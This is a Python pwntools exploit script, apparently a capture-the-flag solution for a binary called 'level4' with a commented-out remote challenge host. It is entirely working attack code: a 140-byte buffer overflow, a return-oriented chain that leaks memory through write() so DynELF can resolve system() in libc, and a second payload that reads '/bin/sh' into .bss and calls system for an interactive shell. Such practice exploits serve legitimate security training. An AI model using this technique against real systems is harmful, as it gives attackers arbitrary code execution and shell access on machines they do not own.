from pwn import *

# a = remote("pwn2.jarvisoj.com", "9880")
a = process('level4')
elf = ELF("level4")
plt_write = elf.symbols["write"]
vulner_addr = elf.symbols["vulnerable_function"]


def leak(addr):
    payload = flat('A' * 140, plt_write, vulner_addr, 1, addr, 4)
    a.send(payload)
    data = a.recv(4)
    return data


b = DynELF(leak, elf=ELF("level4"))
system_addr = b.lookup("system", "libc")
plt_read = elf.symbols["read"]
bss_addr = 0x0804A024
pppr_addr = 0x08048509
payload1 = flat('A' * 140, plt_read, pppr_addr, 0, bss_addr, 8, system_addr, 1, bss_addr)
a.sendline(payload1)
a.sendline("/bin/sh")
a.interactive()
